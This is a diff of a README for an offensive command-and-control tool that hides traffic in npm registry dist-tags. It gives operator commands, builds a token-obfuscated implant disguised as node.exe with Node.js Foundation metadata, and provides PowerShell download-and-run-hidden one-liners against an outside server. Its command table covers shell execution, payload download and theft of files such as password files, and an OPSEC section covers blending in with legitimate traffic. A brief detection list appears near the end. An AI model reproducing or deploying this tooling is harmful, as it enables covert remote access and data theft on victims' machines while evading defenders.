@@ -35,50 +35,47 @@ Node.js-masquerading EXE. Tags on the wire look like CI build artifacts.
 - [Detection](#detection)
 - [Limitations](#limitations)
 - [Troubleshooting](#troubleshooting)
+- [lolc2](#lolc2)
 - [License](#license)
 
 ## Architecture
 
 ```
-┌─ operator ───────────────────┐     ┌─ registry.npmjs.org ────┐     ┌─ implant ──────┐
-│ npm-c2 operator task --cmd   │     │                          │     │                │
-│   PUT + tag name + Bearer    │────>│  x64-<nonce>_<b64>      │<────│  GET every N   │
-│                              │     │  arm64-<nonce>_<b64>    │     │  seconds       │
-│ npm-c2 operator poll         │     │  ia32-<nonce>           │     │                │
-│   GET all dist-tags          │<────│  latest -> 1.0.0        │────>│  PUT result    │
-│   decode + print             │     │                          │     │  exec cmd      │
-└──────────────────────────────┘     └──────────────────────────┘     └────────────────┘
+operator                          registry.npmjs.org                    implant
+  |                                     |                                 |
+  | PUT dist-tag: x64-<nonce>_<b64>    |                                 |
+  | Authorization: Bearer <token>       |                                 |
+  |_____________________________________|                                 |
+  |                                     |                                 |
+  |                                     |  GET /-/package/p/dist-tags     |
+  |                                     |<________________________________|
+  |                                     |                                 |
+  |                                     |  {x64-*:1.0.0, arm64-*:1.0.0}  |
+  |                                     |________________________________>|
+  |                                     |                                 | 
+  |                                     |  decode x64-*, exec command     |
+  |                                     |  PUT arm64-<nonce>_<b64(out)>   |
+  |                                     |<________________________________|
+  |                                     |                                 |
+  |  GET /-/package/p/dist-tags         |                                 |
+  |<____________________________________|                                 |
+  |  decode arm64-*, print output       |                                 |
 ```
-
-Reading tags requires no authentication. Writing tags requires an npm token
-scoped to the package. The token can be embedded in the implant XOR-obfuscated
-with SHA256(package) as key.
 
 ## Installation
 
 ```
 pip install -e .
-```
-
-Requires Python 3.8+. The only runtime dependency is `requests`.
-
-```
 npm-c2 --version
 npm-c2 --self-test
 ```
 
-Expected output:
-
-```
-1.0.0
-[+] all tests ok
-```
+Requires Python 3.8+. Only dependency is `requests`.
 
 ## Quick Reference
 
-### Operator
-
 ```
+# operator
 npm-c2 operator -p <pkg> -t <tok> task --cmd "whoami"
 npm-c2 operator -p <pkg> -t <tok> task --file script.ps1
 npm-c2 operator -p <pkg> -t <tok> poll
@@ -87,20 +84,14 @@ npm-c2 operator -p <pkg> -t <tok> beacons
 npm-c2 operator -p <pkg> -t <tok> clean
 npm-c2 operator -p <pkg> -t <tok> clean --all
 npm-c2 operator -p <pkg> -t <tok> stats
-```
 
-### Build
-
-```
+# build
 npm-c2 --generate-standalone > implant.py
 npm-c2 --generate-standalone -t <tok> -p <pkg> > implant.py
 npm-c2 obfuscate -p <pkg> -t <tok>
 build.bat
-```
 
-### Implant
-
-```
+# implant
 python standalone_implant.py -p <pkg> --interval 120
 node.exe -p <pkg> --interval 120
 ```
@@ -109,8 +100,8 @@ node.exe -p <pkg> --interval 120
 
 ### 1. Create an npm account
 
-Register at https://npmjs.com. Enable two-factor authentication with a
-security key (Windows Hello, YubiKey). npm no longer accepts TOTP.
+Register at https://npmjs.com. Enable 2FA with a security key (Windows
+Hello, YubiKey). npm no longer accepts TOTP.
 
 ### 2. Publish a package
 
@@ -119,18 +110,14 @@ mkdir c2-channel && cd c2-channel
 npm init -y
 ```
 
-Edit `package.json`. Pick a benign name:
-
-- `npx-telemetry-collector`
-- `@scope/internal-metrics` (scoped packages need `--access public`)
-- `telemetry-aggregator-v2`
+Pick a benign name and publish.
 
 ```
 npm publish
 ```
 
-Publish once. You never need to update the package. The version stays at
-1.0.0. All data flows through dist-tags, not package content.
+Publish once. Version stays at 1.0.0 forever. Data flows through
+dist-tags, not package content.
 
 ### 3. Create a token
 
@@ -138,52 +125,34 @@ Publish once. You never need to update the package. The version stays at
 npm token create --bypass-2fa --name npm-c2
 ```
 
-Or create at https://npmjs.com/settings/tokens. Required settings:
+Go to https://npmjs.com/settings/tokens. Scope the token to the single
+package. Permission: Read and Write. Bypass 2FA: enabled.
 
-| setting | value |
-|---------|-------|
-| Scope | single package (the one you published) |
-| Permission | Read and Write |
-| Bypass 2FA | enabled |
-
-A scoped token limits damage to one package if extracted.
-
-Note on the 2027 deprecation: npm will stop bypass2fa tokens from publishing
-directly in January 2027. Reading tags never requires auth. Create your token
-before the deadline.
+npm bypass2fa tokens lose publish ability in January 2027. Reads never
+require auth. Create your token before the deadline.
 
 ### 4. Test the operator
 
 ```
 npm-c2 operator -p npx-telemetry-collector -t npm_xxxx task --cmd whoami
 npm-c2 operator -p npx-telemetry-collector -t npm_xxxx stats
-```
-
-Expected output:
-
-```
-[+] x64-1d3573_d2hvYW1p
-pending: 1, results: 0, beacons: 0
-```
-
-```
 npm-c2 operator -p npx-telemetry-collector -t npm_xxxx clean
 ```
 
 ## Build the Implant
 
-### Generate the Python standalone
+### Generate standalone
 
 ```
-# Read-only mode (no token)
+# read-only (no token)
 npm-c2 --generate-standalone > standalone_implant.py
 
-# Write-back mode (token embedded obfuscated)
+# write-back (token embedded obfuscated)
 npm-c2 --generate-standalone -t npm_xxxx -p npx-telemetry-collector > standalone_implant.py
 ```
 
-The token is XOR-obfuscated with SHA256(package)[:16]. The string `npm_`
-never appears in the file. Decryption happens in memory at startup.
+Token is XOR-obfuscated with SHA256(package)[:16]. The string `npm_`
+never appears in the output file.
 
 ### Compile to EXE
 
@@ -192,22 +161,12 @@ pip install pyinstaller
 build.bat
 ```
 
-Produces `dist\node.exe`.
-
-| attribute | value |
-|-----------|-------|
-| File name | node.exe |
-| Description | Node.js Event-based I/O |
-| Company | Node.js Foundation |
-| Version | 22.7.0.0 |
-| Console | none |
-
-The binary is a single PE file. No additional files or Python installation
-required on the target.
+Produces `dist\node.exe`. Single file, no console. Version info shows
+Node.js v22.7.0, company Node.js Foundation. No Python needed on target.
 
 ## Deploy
 
-### Compiled EXE (recommended)
+### Compiled EXE
 
 Serve `node.exe` from any HTTP server.
 
@@ -215,13 +174,13 @@ Serve `node.exe` from any HTTP server.
 powershell -c "iwr -Uri http://your-server/node.exe -OutFile $env:TEMP\node.exe; Start-Process $env:TEMP\node.exe -Arg '-p npx-telemetry-collector --interval 120' -WindowStyle Hidden"
 ```
 
-### Python script (needs Python on target)
+### Python script
 
 ```
 python standalone_implant.py -p npx-telemetry-collector --interval 120 --verbose
 ```
 
-The script has zero pip dependencies. Only stdlib.
+Zero pip dependencies. Only stdlib.
 
 ### SMB
 
@@ -232,67 +191,61 @@ start /b %TEMP%\node.exe -p npx-telemetry-collector --interval 120
 
 ## Walkthrough
 
-### Phase 1: Queue a command
+### Queue a command
 
 ```
 npm-c2 operator -p npx-telemetry-collector -t npm_xxxx task --cmd whoami
 [+] x64-1d3573_d2hvYW1p
 ```
 
-A dist-tag is created: `x64-1d3573_d2hvYW1p`. The base64 decodes to
-`whoami`. The nonce `1d3573` prevents tag collision.
-
-### Phase 2: Deploy the implant
+### Deploy the implant
 
 ```
 npm-c2 --generate-standalone -t npm_xxxx -p npx-telemetry-collector > standalone_implant.py
 build.bat
 ```
 
-Serve `dist\node.exe` from a web server. On target:
+Serve and run on the target.
 
 ```
 powershell -c "iwr -Uri http://10.0.0.1/node.exe -OutFile $env:TEMP\node.exe; Start-Process $env:TEMP\node.exe -Arg '-p npx-telemetry-collector --interval 30' -WindowStyle Hidden"
 ```
 
-### Phase 3: Read the result
+### Read results
 
 ```
 npm-c2 operator -p npx-telemetry-collector -t npm_xxxx poll
 [res] DESKTOP-R7G3\user
 ```
 
-The implant created an `arm64-*` tag with the base64-encoded output. The
-operator decodes and prints it.
-
-### Phase 4: Interact
+### Interact
 
 ```
 npm-c2 operator -p npx-telemetry-collector -t npm_xxxx task --cmd "ipconfig /all"
 npm-c2 operator -p npx-telemetry-collector -t npm_xxxx watch --interval 5
 ```
 
-### Phase 5: Clean up
+### Clean up
 
 ```
 npm-c2 operator -p npx-telemetry-collector -t npm_xxxx clean --all
 [+] removed 12 tags
 ```
 
-Only `latest -> 1.0.0` remains. No trace of C2 activity in the registry.
+Only `latest -> 1.0.0` remains.
 
 ## Implant Commands
 
 | format | example | description |
 |--------|---------|-------------|
-| `shell command` | `whoami` | Executes via subprocess. Returns stdout + stderr. |
-| `exec:<cmd>` | `exec:powershell -enc ...` | Explicit exec prefix. Use when command starts with a reserved word. |
-| `dl:<url>:<path>` | `dl:http://server/payload.exe:C:\temp\upd.exe` | Downloads a file. Creates directories. |
+| `shell command` | `whoami` | Executes via subprocess. Returns stdout+stderr. |
+| `exec:<cmd>` | `exec:powershell -enc ...` | Explicit exec prefix. |
+| `dl:<url>:<path>` | `dl:http://server/x.exe:C:\temp\x.exe` | Downloads a file. Creates directories. |
 | `up:<path>` | `up:C:\Users\user\pass.txt` | Reads a file. Returns base64. |
 | `sleep:<sec>` | `sleep:300` | Changes poll interval at runtime. |
 | `exit` | `exit` | Removes all tags. Terminates. |
 
-Any string without a recognized prefix runs as a shell command.
+Anything without a recognized prefix runs as a shell command.
 
 ## Protocol
 
@@ -302,8 +255,8 @@ Any string without a recognized prefix runs as a shell command.
 <prefix><nonce>_[<base64url payload>]
 ```
 
-| part | bytes | description |
-|------|-------|-------------|
+| part | length | description |
+|------|--------|-------------|
 | prefix | 4 | x64-, arm64-, ia32- |
 | nonce | 6 | 3 random bytes as hex |
 | _ | 1 | separator |
@@ -311,118 +264,112 @@ Any string without a recognized prefix runs as a shell command.
 
 ### Tag types
 
-| pattern | purpose | writer | appearance |
-|---------|---------|--------|------------|
-| x64-<nonce>_<b64> | command | operator | CI build artifact |
-| arm64-<nonce>_<b64> | result | implant | CI build artifact |
-| ia32-<nonce> | heartbeat | implant | CI build artifact |
-| latest | static | npm | published version |
+| pattern | purpose | writer |
+|---------|---------|--------|
+| x64-<nonce>_<b64> | command | operator |
+| arm64-<nonce>_<b64> | result | implant |
+| ia32-<nonce> | heartbeat | implant |
+| latest | static | npm |
 
-All protocol tags point to `1.0.0`. The value is irrelevant.
+All point to `1.0.0`. The value carries no data.
 
 ### Capacity
 
-One tag holds about 170 bytes of raw data. Commands longer than that split
-across multiple tags, each with its own nonce. The implant processes each
-tag as an independent command. For large payloads use `dl:` to fetch from
-a remote server.
+Each tag holds roughly 170 bytes of raw command. Longer commands split
+across multiple tags, each with its own nonce. For big payloads use `dl:`.
 
 ### Polling
 
-The implant sleeps `interval + random(0, jitter)` seconds per cycle.
-Default: 60-80 seconds. Every 10 cycles it sends a heartbeat tag.
-Seen tags persist to a state file and survive restarts.
+Sleeps `interval + random(0, jitter)` seconds per cycle. Default is
+60-80 seconds. Heartbeat every 10 cycles. Seen tags persist to a state
+file at `%APPDATA%\Microsoft\Crypto\.rsa_<pkg>.idx`.
 
 ## Token Obfuscation
 
 ```
-plaintext:  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
-key:        SHA256("npx-telemetry-collector")[:16]
-XOR:        85252546b6187c0395f050fa27604e9f...
+token:  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
+key:    SHA256("npx-telemetry-collector")[:16]
+result: 85252546b6187c0395f050fa27604e9f...
 ```
 
-The token is XOR-encrypted with the first 16 bytes of SHA256(package).
-The key is deterministic per package. Different package, different key.
-
-Properties:
-
-- The string `npm_` does not appear in the binary
-- The obfuscated output is a hex string that looks like a hash
-- Decryption happens in memory at startup
-- Wrong package name produces garbage (None)
-
-Commands:
+XOR with SHA256(package) truncated to 16 bytes. Different package,
+different key. The hex output looks like a hash. `npm_` never appears
+in the binary. Decryption happens in memory at startup.
 
 ```
-# Print obfuscated hex only
 npm-c2 obfuscate -p npx-telemetry-collector -t npm_xxxx
-
-# Embed directly during standalone generation
 npm-c2 --generate-standalone -t npm_xxxx -p npx-telemetry-collector > implant.py
 ```
 
-This is obfuscation, not encryption. The deobfuscation code is in the same
-binary. A determined reverser can extract the token. Combine with short-lived
-tokens and scoped permissions.
+This is obfuscation, not encryption. The deobfuscation code lives in
+the same binary. A reverser can extract the token. Combine with
+short-lived tokens and scoped permissions.
 
 ## OPSEC
 
 | surface | mitigation |
 |---------|------------|
 | Network traffic | registry.npmjs.org:443, whitelisted by most proxies |
-| Polling pattern | Gaussian jitter, no fixed interval |
+| Polling pattern | gaussian jitter, no fixed interval |
 | Process name | node.exe, Node.js metadata |
 | User-Agent | npm/11.18.0 node/v22.7.0 win32 x64 |
-| Token | XOR-obfuscated, not visible in strings, decrypted in memory |
-| Tag names | x64-*, arm64-*, ia32-* -- look like CI platform builds |
-| State file | %APPDATA%\Microsoft\Crypto\.rsa_*.idx, blends with Crypto API |
+| Token in binary | XOR-obfuscated, not visible in strings, decrypted in memory |
+| Tag names | x64-*, arm64-*, ia32-* look like CI platform builds |
+| State file | inside Crypto directory, blends with legitimate files |
 | Cache | Cloudflare caches GET, no direct hit on npm origin |
 
 ## Detection
 
-For defenders. Understanding the detection surface helps both sides.
-
-1. A non-Node.js process polling registry.npmjs.org at regular intervals.
-2. Rapid creation and deletion of dist-tags. Normal packages change tags
-   a few times a day. C2 changes them every poll cycle.
-3. A package with only version 1.0.0 but accumulating dozens of dist-tags.
+1. Non-Node.js process polling registry.npmjs.org at regular intervals.
+2. Rapid dist-tag creation and deletion on a single package. Normal
+   packages change tags a few times a day. C2 changes them every
+   poll cycle.
+3. A package with only version 1.0.0 but accumulating dozens of tags.
 4. User-Agent mismatch: Python-urllib/3.x instead of npm CLI UA.
-5. TLS JA3 fingerprint of Python/Go differs from Node.js (Schannel).
+5. TLS fingerprint (JA3) of Python or Go differs from Node.js which
+   uses Schannel on Windows.
 6. npm token in non-Node.js process memory or binary.
 
 ## Limitations
 
-**Cache.** Cloudflare may cache GET responses up to 60 seconds. Writes
-bypass cache immediately.
+**Cache.** Cloudflare caches GET responses for up to 60 seconds. Writes
+bypass cache.
 
-**Token expiry.** npm bypass2fa tokens lose publish ability in January
-2027. Reads never require auth. Create tokens before the deadline.
+**Token expiry.** bypass2fa tokens lose publish ability in January 2027.
+Reads never need auth. Create tokens before the deadline.
 
-**Single-threaded.** The implant polls, executes, and writes sequentially.
-A long-running command blocks the next poll. Use `dl:` to fetch a script
-that runs in a separate process.
+**Single-threaded.** Polls, executes, and writes in sequence. A long
+command blocks the next poll. Use `dl:` for async work.
 
-**No encryption beyond HTTPS.** Tag names and values travel in plaintext
-inside the TLS tunnel. npm and Cloudflare can see raw tag data. Do not
-send operational secrets as commands.
+**Plaintext inside TLS.** Tag names and values travel in plaintext inside
+the TLS tunnel. npm and Cloudflare can see them. Do not send secrets as
+commands.
 
 **Windows only.** The implant targets Windows. The operator runs on any
 OS with Python.
 
 ## Troubleshooting
 
-**Tag write returns 401.** The token lacks write permission. Verify token
-scope and permissions at https://npmjs.com/settings/tokens.
+**401 on write.** Token lacks write permission. Check scope at
+https://npmjs.com/settings/tokens.
 
-**Tag write returns 403.** The token needs bypass2fa. Create a new token
-with bypass2fa enabled or use interactive npm login.
+**403 on write.** Token needs bypass2fa. Create a new token or publish
+manually with npm login.
 
-**Poll returns no results.** The implant may not have polled yet, may lack
-a token for write-back, or results were already cleaned. Use `--verbose`
-on the implant to see activity.
+**Empty poll results.** Implant may not have polled yet, lacks a token
+for write-back, or results were cleaned. Run the implant with `--verbose`
+to see activity.
 
-**State file corruption.** Delete `%APPDATA%\Microsoft\Crypto\.rsa_<pkg>.idx`
+**State file issues.** Delete `%APPDATA%\Microsoft\Crypto\.rsa_<pkg>.idx`
 and restart. Old commands may re-execute.
+
+## lolc2
+
+This project is listed on the lolc2 project registry:
+
+- https://lolc2.github.io/
+- C2 data entry: `npm Registry` in c2_data.json
+- Doc: doc/npm_registry.md
 
 ## License
 
